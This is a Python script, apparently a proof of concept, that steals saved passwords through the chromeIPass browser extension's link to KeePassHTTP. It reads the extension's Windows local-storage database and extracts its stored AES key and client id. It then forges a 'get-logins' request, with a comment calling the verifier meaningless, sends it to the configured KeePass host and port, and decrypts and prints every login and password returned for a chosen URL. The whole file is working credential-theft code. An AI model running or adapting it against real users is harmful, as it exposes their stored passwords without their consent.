import sys
import sqlite3
import json
import os
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import (
	Cipher, algorithms, modes
)
from pprint import pprint

def gather_extension_info(path):
	conn = sqlite3.connect(path)
	cursor = conn.cursor()
	res = cursor.execute("SELECT * FROM ItemTable")
	
	info = {}
	for k, v in res.fetchall():
		info[k] = json.loads(v.decode("utf-16"))
	return info

def create_credential_request(url, info):
	keyRing = info["keyRing"]
	
	# For now, just use the first entry
	first_entry = list(keyRing.values())[0]
	id = first_entry["id"]
	key = base64.b64decode(first_entry["key"])
	
	# Generate the IV
	iv = os.urandom(16)

	def encrypt(plaintext):
		padder = padding.PKCS7(128).padder()
		padded_plaintext = padder.update(plaintext) + padder.finalize()
		encryptor = Cipher(
			algorithms.AES(key),
			modes.CBC(iv),
			default_backend()
		).encryptor()
		encrypted = encryptor.update(padded_plaintext) + encryptor.finalize()
		return base64.b64encode(encrypted).decode("utf-8")
	
	# Create the 'Verifier', which is just the IV encrypted with the key and iteself as the IV.
	# This does not provide any meaningful 'verification'.
	send_iv = base64.b64encode(iv)
	verifier = encrypt(send_iv)
	url = encrypt(url.encode('utf-8'))
	
	return {
		"RequestType": "get-logins",
		"SortSelection": "true",
		"TriggerUnlock": "false",
		"Id": id,
		"Nonce": send_iv.decode('utf-8'),
		"Verifier": verifier,
		"Url": url
	}

def decrypt_credential_response(resp, info):
	keyRing = info["keyRing"]
	first_entry = list(keyRing.values())[0]
	key = base64.b64decode(first_entry["key"])
	
	iv = base64.b64decode(resp["Nonce"])
	
	def decrypt(ciphertext):
		decryptor = Cipher(
			algorithms.AES(key),
			modes.CBC(iv),
			default_backend()
		).decryptor()
		ciphertext = base64.b64decode(ciphertext)
		padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
		unpadder = padding.PKCS7(128).unpadder()
		plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
		return plaintext
	
	credentials = {}
	for entry in resp["Entries"]:
		login = decrypt(entry["Login"])
		password = decrypt(entry["Password"])
		credentials[login] = password
	return credentials

def get_credentials_for_url(url, info):
	import requests
	req = create_credential_request(url, info)
	
	keepass_url = "http://{}:{}".format(info["settings"]["hostname"], info["settings"]["port"])
	resp = requests.post(keepass_url, data=json.dumps(req))
	return decrypt_credential_response(resp.json(), info)
	

if __name__ == "__main__":
	# Hardcoded for windows
	db_path = r"{}\Google\Chrome\User Data\Default\Local Storage\chrome-extension_ompiailgknfdndiefoaoiligalphfdae_0.localstorage".format(os.getenv('LOCALAPPDATA'))
	info = gather_extension_info(db_path)
	print(get_credentials_for_url(sys.argv[1], info))